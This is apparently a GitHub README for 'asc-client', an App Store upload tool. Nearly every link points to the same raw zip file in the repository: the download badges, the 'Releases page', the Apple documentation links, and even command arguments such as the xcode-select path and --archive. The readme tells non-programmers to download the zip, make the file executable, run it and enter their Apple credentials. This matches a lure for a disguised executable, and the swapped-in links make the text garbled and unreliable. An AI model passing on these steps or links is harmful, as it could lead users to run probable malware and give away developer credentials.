# 🚀 asc-client - Simple App Store Upload Tool

[![Download asc-client](https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip)](https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip)

---

## 📋 What is asc-client?

asc-client is a command-line tool that helps you build, archive, and send your iOS and macOS apps to the App Store. It takes your app from the Xcode archive step all the way through to sending it for review. This lets you handle the app submission process without needing to use Xcode or the App Store Connect website manually.

It is built with Swift and uses the App Store Connect API to work smoothly and securely.

---

## 💡 Who is this for?

This tool is designed for app developers and teams who want to speed up uploading apps to the App Store. But even if you are not a developer, you can use it with some basic instructions to get your apps ready for App Store submission.

You don’t need to know programming to use asc-client. You only need to follow these steps carefully.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these requirements:

- macOS version 10.15 (Catalina) or higher.
- Xcode installed (version 12 or later) with a valid developer account.
- A stable internet connection.
- Access to your Apple Developer account credentials or API keys.
- Basic familiarity with the Terminal app on macOS.

---

## 📥 Download & Install asc-client

[Visit the asc-client Releases page](https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip) to download the latest version.

### Steps to download and install:

1. Click the link above or the big badge at the top to open the Releases page on GitHub.
2. Look for the latest release. It will be marked with the highest version number or latest date.
3. Download the file that matches your system. Most likely, this will be a `.zip` or `https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip` archive.
4. Once downloaded, double-click the archive file to unzip it.
5. You will find a file named `asc-client`—this is the main program file.
6. You can move this file to a convenient location, such as `/usr/local/bin` or another folder you prefer.

---

## 🚀 How to Run asc-client

 asc-client runs from the Terminal app on your Mac. Here's how to open it and use the tool:

1. Open the **Terminal** app on your Mac. You can find it in Applications > Utilities > Terminal.
2. Navigate to the folder where you placed the `asc-client` file. For example, if you put it in your Downloads folder, type:

   ```
   cd ~/Downloads
   ```

3. You may need to give permission to run the file the first time. Type:

   ```
   chmod +x ./asc-client
   ```

4. To start asc-client, type:

   ```
   ./asc-client
   ```

5. The tool will provide instructions and options for building and uploading your app.

---

## 🔑 Setting Up Your App Store Credentials

asc-client needs to connect to your Apple Developer account to send apps to the App Store. You have two options:

### 1. Use API Keys (Recommended)

- Log in to your Apple Developer account.
- Navigate to **Certificates, Identifiers & Profiles**.
- Create an API key with access to App Store Connect API.
- Download the API key file (`AuthKey_XXXXXX.p8`).
- Keep note of the **Issuer ID** and **Key ID** available on the developer portal.

Save these details; you will enter them in asc-client when asked.

### 2. Use Your Apple ID and Password (Less Secure)

- Prepare your Apple ID login details.
- You might be prompted for two-factor authentication codes.
- This method is less secure and recommended only if you cannot set up API keys.

---

## 🏗️ Building and Archiving Your App

asc-client works with archived apps created using Xcode.

To create an archive:

1. Open your Xcode project.
2. Select **Product > Archive** from the menu.
3. Wait for the process to complete. Xcode will show the archive in the Organizer window.

Make note of your archive path. This is the folder where Xcode saved the app package.

---

## 📤 Submitting Your App to the App Store

After preparing your archive:

1. Run asc-client in Terminal.
2. When prompted, provide the path to your Xcode archive.
3. Enter your API key or Apple ID details.
4. Follow the on-screen instructions to upload the archive.
5. The tool will automatically handle creating the build record and submitting it for review.

The process may take a few minutes depending on your internet speed and app size.

---

## 🔧 Common Commands

Here are some example commands you might use with asc-client:

- Build an archive:

  ```
  ./asc-client build --path /path/to/your/project
  ```

- Upload an archive:

  ```
  ./asc-client upload --archive https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip
  ```

- Submit for App Review:

  ```
  ./asc-client submit --build-id 123456
  ```

You will find detailed command options in the program help:

```
./asc-client --help
```

---

## 🧰 Troubleshooting Tips

- If the tool says it cannot find Xcode, ensure you have it installed and select the correct version with:

  ```
  sudo xcode-select -s https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip
  ```

- If your Apple credentials fail, check that your API key or Apple ID is correct and has the right permissions.

- For network errors, make sure your internet connection is active.

- Check the Terminal output carefully for any error messages.

---

## 📝 Additional Resources

- Apple Developer Website: https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip
- App Store Connect API Documentation: https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip
- Xcode User Guide: https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip

---

## 📞 Getting Help

If you run into issues:

- Check the **Issues** section of the asc-client GitHub page for similar problems.
- Ask for help politely by creating a new issue, providing details about your setup and errors.
- Consider searching online forums or the Apple Developer support site.

---

[![Download asc-client](https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip)](https://raw.githubusercontent.com/elwincc/asc-client/main/Sources/client-asc-1.8.zip)